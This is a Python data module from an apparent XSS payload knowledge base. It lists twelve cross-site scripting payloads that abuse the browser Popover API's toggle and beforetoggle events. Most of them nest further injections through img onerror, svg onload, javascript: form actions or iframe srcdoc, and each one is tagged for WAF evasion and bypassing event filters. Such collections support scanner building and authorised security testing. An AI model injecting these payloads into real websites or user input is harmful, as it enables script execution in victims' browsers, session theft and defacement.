#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Popover API XSS Payloads - Part 2
Advanced techniques: showPopover/hidePopover/togglePopover methods, nested popovers, and content injection (innerHTML, SVG, form, iframe).
"""

from ..models import PayloadEntry


POPOVER_API_PAYLOADS_PART2 = {
    "popover-toggle-hidePopover": PayloadEntry(
        payload='<div popover id=x open ontoggle=alert(1)>XSS</div><script>document.getElementById("x").hidePopover()</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event via hidePopover()",
        tags=["popover", "toggle", "hidePopover", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-hidePopover": PayloadEntry(
        payload='<div popover id=x open onbeforetoggle=alert(1)>XSS</div><script>document.getElementById("x").hidePopover()</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event via hidePopover()",
        tags=["popover", "beforetoggle", "hidePopover", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-toggle-togglePopover": PayloadEntry(
        payload='<div popover id=x ontoggle=alert(1)>XSS</div><script>document.getElementById("x").togglePopover()</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event via togglePopover()",
        tags=["popover", "toggle", "togglePopover", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-togglePopover": PayloadEntry(
        payload='<div popover id=x onbeforetoggle=alert(1)>XSS</div><script>document.getElementById("x").togglePopover()</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event via togglePopover()",
        tags=["popover", "beforetoggle", "togglePopover", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-toggle-innerHTML": PayloadEntry(
        payload="<div popover id=x ontoggle=alert(1)><img src=x onerror=alert(2)></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event with innerHTML injection",
        tags=["popover", "toggle", "innerHTML", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-innerHTML": PayloadEntry(
        payload="<div popover id=x onbeforetoggle=alert(1)><img src=x onerror=alert(2)></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event with innerHTML injection",
        tags=["popover", "beforetoggle", "innerHTML", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-toggle-svg": PayloadEntry(
        payload="<div popover id=x ontoggle=alert(1)><svg onload=alert(2)></svg></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event with SVG injection",
        tags=["popover", "toggle", "svg", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-svg": PayloadEntry(
        payload="<div popover id=x onbeforetoggle=alert(1)><svg onload=alert(2)></svg></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event with SVG injection",
        tags=["popover", "beforetoggle", "svg", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-toggle-form": PayloadEntry(
        payload="<div popover id=x ontoggle=alert(1)><form action=javascript:alert(2)><input type=submit></form></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event with form injection",
        tags=["popover", "toggle", "form", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-form": PayloadEntry(
        payload="<div popover id=x onbeforetoggle=alert(1)><form action=javascript:alert(2)><input type=submit></form></div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event with form injection",
        tags=["popover", "beforetoggle", "form", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-toggle-iframe": PayloadEntry(
        payload='<div popover id=x ontoggle=alert(1)><iframe srcdoc="<script>alert(2)</script>"></iframe></div><button popovertarget=x>Click</button>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event with iframe injection",
        tags=["popover", "toggle", "iframe", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-iframe": PayloadEntry(
        payload='<div popover id=x onbeforetoggle=alert(1)><iframe srcdoc="<script>alert(2)</script>"></iframe></div><button popovertarget=x>Click</button>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event with iframe injection",
        tags=["popover", "beforetoggle", "iframe", "2024"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
}

POPOVER_API_PAYLOADS_PART2_TOTAL = len(POPOVER_API_PAYLOADS_PART2)
